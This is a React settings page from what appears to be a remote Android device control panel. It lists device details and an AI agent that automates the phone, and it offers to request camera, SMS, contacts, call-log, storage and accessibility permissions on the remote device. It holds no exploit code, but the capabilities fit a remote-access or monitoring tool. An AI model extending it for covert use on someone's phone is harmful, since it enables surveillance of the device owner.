import { useEffect, useState, useCallback } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import Background from '../components/Background';
import Toast from '../components/Toast';
import { getDevice, clearAgentChat, getAgentChat, sendCommand } from '../lib/store';

const PERMISSIONS = [
  { key: 'accessibilityEnabled', label: 'Accessibility Service',   perm: 'accessibility',  desc: 'Required for device control' },
  { key: 'perm_overlay',         label: 'Draw Over Apps',          perm: 'overlay',        desc: 'Show overlay on screen' },
  { key: 'perm_write_settings',  label: 'Modify System Settings',  perm: 'write_settings', desc: 'Control brightness etc.' },
  { key: 'perm_camera',          label: 'Camera',                  perm: 'camera',         desc: 'Live camera access' },
  { key: 'perm_sms',             label: 'Read SMS',                perm: 'sms',            desc: 'Read incoming messages' },
  { key: 'perm_contacts',        label: 'Contacts',                perm: 'contacts',       desc: 'Read contact list' },
  { key: 'perm_call_log',        label: 'Call Logs',               perm: 'call_log',       desc: 'Read call history' },
  { key: 'perm_storage',         label: 'Storage',                 perm: 'storage',        desc: 'Read files on device' },
  { key: 'perm_notifications',   label: 'Notifications',           perm: 'notifications',  desc: 'Post notifications' },
  { key: 'perm_usage_stats',     label: 'Usage Access',            perm: 'usage_stats',    desc: 'App usage statistics' },
];

export default function More() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [toast, setToast] = useState({ show: false, msg: '', type: 'success' });
  const [clearing, setClearing] = useState(false);
  const [msgCount, setMsgCount] = useState(0);
  const [requesting, setRequesting] = useState({});

  const flash = (msg, type = 'success') => {
    setToast({ show: true, msg, type });
    setTimeout(() => setToast(t => ({ ...t, show: false })), 2200);
  };

  const load = useCallback(async () => {
    try {
      const d = await getDevice(id);
      setDevice(d);
      const ch = await getAgentChat(id);
      setMsgCount((ch.messages || []).filter(m => m.role !== 'system_note').length);
    } catch {}
  }, [id]);

  useEffect(() => {
    load();
    const t = setInterval(load, 4000);
    return () => clearInterval(t);
  }, [load]);

  const clearChat = async () => {
    setClearing(true);
    try {
      await clearAgentChat(id);
      setMsgCount(0);
      flash('Agent chat cleared');
    } catch { flash('Failed', 'error'); }
    setClearing(false);
  };

  const requestPerm = async (perm) => {
    if (requesting[perm]) return;
    setRequesting(r => ({ ...r, [perm]: true }));
    try {
      await sendCommand(id, 'request_permission', { perm });
      flash('Sent — check device screen');
    } catch { flash('Failed to send', 'error'); }
    setTimeout(() => setRequesting(r => ({ ...r, [perm]: false })), 3000);
  };

  const getPermValue = (key) => device ? (device[key] ?? null) : null;

  return (
    <div className="min-h-screen flex flex-col bg-bg text-white pb-[max(16px,env(safe-area-inset-bottom))]">
      <Background />
      <Toast {...toast} />

      <header className="relative z-20 flex items-center gap-2 px-3 py-2.5 border-b border-white/[0.06] bg-bg/80 backdrop-blur-xl flex-shrink-0">
        <button onClick={() => navigate('/device/' + encodeURIComponent(id))} className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/75 hover:bg-white/10 active:scale-95 transition-all">
          <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2.2"><path d="M15 18l-6-6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg>
        </button>
        <div className="flex-1">
          <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35">More</div>
          <div className="text-[13px] font-bold text-white/95">Settings & Features</div>
        </div>
      </header>

      <div className="relative z-10 flex-1 overflow-y-auto px-3 py-3 space-y-4">

        {device && (
          <div>
            <div className="text-[9px] font-bold tracking-[1.8px] uppercase text-white/30 mb-2 ml-1">Device Info</div>
            <div className="glass rounded-xl border border-white/[0.08] p-3 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-[11px] text-white/45">Device</span>
                <span className="text-[12px] font-bold text-white/85">{device.brand} {device.model}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-[11px] text-white/45">Android</span>
                <span className="text-[12px] font-bold text-white/85">{device.androidVersion} (SDK {device.sdkInt})</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-[11px] text-white/45">Resolution</span>
                <span className="text-[12px] font-bold text-white/85">{device.screenW} x {device.screenH}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-[11px] text-white/45">Status</span>
                <span className={`text-[11px] font-bold ${device.online ? 'text-emerald-400' : 'text-rose-400'}`}>{device.online ? 'Online' : 'Offline'}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-[11px] text-white/45">App Version</span>
                <span className="text-[12px] font-bold text-white/85">{device.appVersion || '-'}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-[11px] text-white/45">IP</span>
                <span className="text-[11px] font-mono text-white/55">{device.ip || '-'}</span>
              </div>
            </div>
          </div>
        )}

        <div>
          <div className="text-[9px] font-bold tracking-[1.8px] uppercase text-white/30 mb-2 ml-1">AI Agent</div>
          <div className="glass rounded-xl border border-white/[0.08] divide-y divide-white/[0.05]">
            <div className="px-3 py-3">
              <div className="flex items-center gap-2 mb-1">
                <span className="w-2 h-2 rounded-full bg-accent" />
                <span className="text-[11px] font-bold text-white/75">Powered by Replit AI Credits</span>
              </div>
              <div className="text-[10.5px] text-white/40 leading-relaxed">No OpenAI API key required. Agent uses GPT-4o-mini via Replit AI proxy.</div>
            </div>
            <div className="px-3 py-3 flex items-center justify-between">
              <div>
                <div className="text-[11.5px] font-bold text-white/75">Chat History</div>
                <div className="text-[10px] text-white/40">{msgCount} message{msgCount !== 1 ? 's' : ''}</div>
              </div>
              <button onClick={clearChat} disabled={clearing || msgCount === 0} className="px-3 py-1.5 rounded-lg bg-rose-500/10 border border-rose-500/25 text-[10px] font-bold tracking-wide uppercase text-rose-300 hover:bg-rose-500/20 active:scale-95 disabled:opacity-40 disabled:cursor-not-allowed transition-all">
                {clearing ? 'Clearing...' : 'Clear Chat'}
              </button>
            </div>
            <button onClick={() => navigate('/device/' + encodeURIComponent(id))} className="w-full px-3 py-3 flex items-center gap-3 hover:bg-white/[0.03] active:scale-[0.99] transition-all text-left">
              <div className="w-8 h-8 rounded-lg bg-accent/10 border border-accent/20 flex items-center justify-center text-accent flex-shrink-0">
                <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 015 0c0 2.5-2.5 3-2.5 5" strokeLinecap="round"/><circle cx="12" cy="17.5" r=".5" fill="currentColor" stroke="none"/></svg>
              </div>
              <div className="flex-1">
                <div className="text-[12px] font-bold text-white/80">Open AI Agent</div>
                <div className="text-[10px] text-white/40">Automate device with AI</div>
              </div>
              <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-white/30 fill-none" strokeWidth="2"><path d="M9 18l6-6-6-6" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </button>
          </div>
        </div>

        <div>
          <div className="text-[9px] font-bold tracking-[1.8px] uppercase text-white/30 mb-2 ml-1">Permissions</div>
          <div className="glass rounded-xl border border-white/[0.08] divide-y divide-white/[0.05]">
            {PERMISSIONS.map(({ key, label, perm, desc }) => {
              const val = getPermValue(key);
              const enabled = val === true;
              const unknown = val === null;
              const busy = !!requesting[perm];
              return (
                <div key={key} className="flex items-center gap-3 px-3 py-3">
                  <button
                    disabled={enabled || unknown || busy}
                    onClick={() => requestPerm(perm)}
                    aria-label={label}
                    className={[
                      'w-5 h-5 rounded-[5px] border flex items-center justify-center flex-shrink-0 transition-all',
                      enabled  ? 'bg-emerald-500/20 border-emerald-500/50 cursor-not-allowed' :
                      unknown  ? 'bg-white/[0.04] border-white/[0.12] cursor-not-allowed' :
                      busy     ? 'bg-accent/20 border-accent/40 cursor-wait' :
                                 'bg-white/[0.04] border-white/[0.18] hover:border-accent/60 hover:bg-accent/10 cursor-pointer active:scale-90'
                    ].join(' ')}
                  >
                    {enabled && (
                      <svg viewBox="0 0 12 12" className="w-3 h-3 stroke-emerald-400 fill-none" strokeWidth="2.2">
                        <path d="M2 6l3 3 5-5" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    )}
                    {!enabled && busy && (
                      <div className="w-2 h-2 rounded-full border border-accent border-t-transparent animate-spin" />
                    )}
                  </button>
                  <div className="flex-1 min-w-0">
                    <div className={`text-[12px] font-bold leading-tight ${enabled ? 'text-white/90' : unknown ? 'text-white/40' : 'text-white/70'}`}>
                      {label}
                    </div>
                    <div className="text-[10px] text-white/35 mt-0.5">{desc}</div>
                  </div>
                  <span className={[
                    'text-[9.5px] font-bold tracking-wide px-2 py-0.5 rounded-full flex-shrink-0',
                    enabled ? 'bg-emerald-500/15 text-emerald-400' :
                    unknown ? 'bg-white/[0.06] text-white/30' :
                              'bg-rose-500/12 text-rose-400'
                  ].join(' ')}>
                    {enabled ? 'ON' : unknown ? '-' : 'OFF'}
                  </span>
                </div>
              );
            })}
          </div>
          <div className="text-[9.5px] text-white/25 text-center mt-2 px-2">
            Tick any OFF permission to open its settings on the device
          </div>
        </div>

      </div>
    </div>
  );
}
